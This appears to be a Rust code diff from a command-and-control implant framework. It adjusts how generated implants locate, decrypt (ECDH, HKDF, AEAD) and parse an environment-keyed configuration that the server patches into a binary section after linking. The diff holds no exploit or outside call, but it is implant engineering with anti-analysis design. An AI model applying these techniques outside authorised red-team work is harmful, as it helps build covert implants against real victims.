@@ -203,9 +203,15 @@ fn load_runtime_config_build_cfg(
 /// Stage 1 — locate the ciphertext in the `.nyx_cfg` section and recover the
 /// keying material: `(keying_levels, config_nonce, server_pub, implant_priv,
 /// ct_with_tag)`. `None` → the caller falls back to the compile-time config.
-fn load_runtime_config_locate_ct() -> Option<(u32, [u8; 12], [u8; 32], [u8; 32], &'static [u8])> {
-    let section: &'static [u8] =
-        unsafe { core::slice::from_raw_parts(&NYX_CFG_PLACEHOLDER as *const u8, 1024) };
+pub(crate) fn load_runtime_config_locate_ct(
+) -> Option<(u32, [u8; 12], [u8; 32], [u8; 32], &'static [u8])> {
+    // `black_box` is load-bearing: the server patches the section bytes
+    // out-of-band AFTER linking, so the optimizer must not constant-fold reads
+    // of NYX_CFG_PLACEHOLDER to its (unpatched) initializer. Fat LTO does
+    // exactly that when it can prove no in-module write exists — which made
+    // generated implants silently fall back to the compile-time config.
+    let base = core::hint::black_box(&NYX_CFG_PLACEHOLDER as *const u8);
+    let section: &'static [u8] = unsafe { core::slice::from_raw_parts(base, 1024) };
     let (keying_levels, config_nonce, data_len) = load_runtime_config_read_header(section)?;
     let (server_pub, implant_priv, ct_with_tag) =
         load_runtime_config_unmask_keys(section, data_len)?;
@@ -279,7 +285,7 @@ fn load_runtime_config_unmask_keys(
 /// Stage 2 — derive the config key (ECDH + HKDF-SHA256), apply the
 /// environment-keying layers, and AEAD-decrypt the ciphertext.
 /// `None` → the caller falls back to the compile-time config.
-fn load_runtime_config_decrypt(
+pub(crate) fn load_runtime_config_decrypt(
     keying_levels: u32,
     config_nonce: &[u8; 12],
     server_pub: &[u8; 32],
@@ -304,7 +310,7 @@ fn load_runtime_config_decrypt(
 
 /// Stage 3 — parse the plaintext fields. Returns the core fields plus the
 /// channel-dispatcher tail (itself parsed by [`load_runtime_config_parse_tail`]).
-fn load_runtime_config_parse_fields(
+pub(crate) fn load_runtime_config_parse_fields(
     plaintext: &[u8],
 ) -> Option<(
     nyx_implant_core::heap::String,
